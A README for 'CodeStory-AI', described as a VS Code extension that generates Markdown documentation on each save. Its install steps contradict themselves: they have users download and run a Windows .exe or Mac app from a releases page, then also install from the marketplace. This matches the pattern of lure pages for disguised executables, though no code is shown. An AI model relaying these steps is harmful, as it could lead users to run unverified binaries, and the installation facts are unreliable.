# 📝 CodeStory-AI - Effortless Documentation for Your Code

[![Download CodeStory-AI](https://img.shields.io/badge/Download_CodeStory--AI-v1.0-blue)](https://github.com/Dada-papa/CodeStory-AI/releases)

## 🚀 Getting Started

CodeStory AI is an intelligent VS Code extension designed to simplify the documentation process for your code. With this tool, you can automatically generate internal documentation each time you save your work. This ensures that your project's knowledge base stays current and complete without any extra effort on your part.

## 📥 Download & Install

To get started with CodeStory AI, follow these steps:

1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Dada-papa/CodeStory-AI/releases) to find the latest version.
2. **Select the Latest Release**: Look for the most recent version listed. It usually appears at the top of the page.
3. **Download the Extension**: Click on the appropriate file for your system. If you are using Windows, you might see a file like `CodeStory-AI-windows.exe`. For Mac users, look for `CodeStory-AI-mac.zip`.
4. **Install the Extension**:
    - **For Windows**: Find the downloaded file, double-click it, and follow the installation prompts.
    - **For Mac**: Open the downloaded ZIP file, and drag the extension into your Applications folder.
5. **Open VS Code**: Launch Visual Studio Code on your computer. 
6. **Add CodeStory AI**: Go to the Extensions view by clicking on the Extensions icon in the Activity Bar on the side. Search for "CodeStory AI" and click "Install."
7. **Start Using**: Once installed, start coding! CodeStory AI will automatically create documentation for you as you save your files.

## 💻 System Requirements

Before downloading, ensure your system meets these requirements:

- **Operating System**: 
  - Windows 10 or later
  - macOS High Sierra (10.13) or later
- **Editor**: Visual Studio Code version 1.50 or later
- **Memory**: At least 4 GB of RAM
- **Disk Space**: 100 MB free space for installation

## 🔍 Features

CodeStory AI offers several features to enhance your documentation experience:

- **Automatic Documentation**: Generates documentation automatically every time you save your code.
- **Markdown Support**: Creates documentation in Markdown format, easy to read and edit.
- **Seamless Integration**: Works directly within Visual Studio Code for a smooth workflow.
- **User-Friendly Interface**: Easy to configure and use, even without programming skills.
- **Customization Options**: Adjust documentation styles and formats to suit your needs.

## 🛠️ Troubleshooting

If you encounter issues while using CodeStory AI, try these helpful tips:

- **Check Installation**: Ensure the extension is correctly installed in VS Code. Go to the Extensions view and confirm it's listed there.
- **Restart VS Code**: Sometimes, a simple restart may resolve minor glitches or issues.
- **Check for Updates**: Always make sure you are using the latest version of both VS Code and CodeStory AI.
- **Consult Documentation**: Refer to the official documentation for common questions and advanced settings.
